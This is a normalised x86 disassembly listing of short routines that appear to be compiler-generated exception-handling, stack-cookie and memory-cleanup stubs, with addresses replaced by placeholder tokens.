mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011cb0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011cd0
mov eax [ ebp - 0x840 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011cde
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x85c ]
xor ecx eax
call sub_10008bf6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011d10
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011d30
mov eax [ ebp + 0x8 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011d3b
mov eax [ ebp + 0x8 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011d46
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011d70
mov eax [ ebp + 0x8 ]
add eax 0x10
jmp sub_10001390
sub_10011d7b
mov eax [ ebp + 0x8 ]
add eax 0x28
jmp sub_10001390
sub_10011d86
mov eax [ ebp - 0x14 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011d91
mov esi [ ebp - 0x14 ]
jmp sub_10002de0
sub_10011d99
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011dc0
lea esi [ ebp - 0x64 ]
jmp sub_10001f10
sub_10011dc8
lea eax [ ebp - 0x4c ]
jmp sub_10001390
sub_10011dd0
lea ebx [ ebp - 0x68 ]
jmp sub_100013b0
sub_10011dd8
mov eax [ ebp + 0x8 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011de3
mov eax [ ebp - 0x18 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011dee
mov eax [ ebp - 0x18 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011df9
mov eax [ ebp - 0x18 ]
push eax
call sub_10008d40
pop ecx
retn
sub_10011e04
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011e1f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10008bf6
mov eax r--data
jmp sub_100108f1
sub_10011ec0
push sub_10011ef0
call sub_10009a0e
pop ecx
retn
sub_10011ed0
call sub_10003290
mov eax [ rw-data ]
push eax
call sub_10008d40
add esp 0x4
mov [ rw-data ] 0x0
retn
sub_10011ef0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call sub_10008d40
add esp 0x4
sub_10011f21
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10008ce9
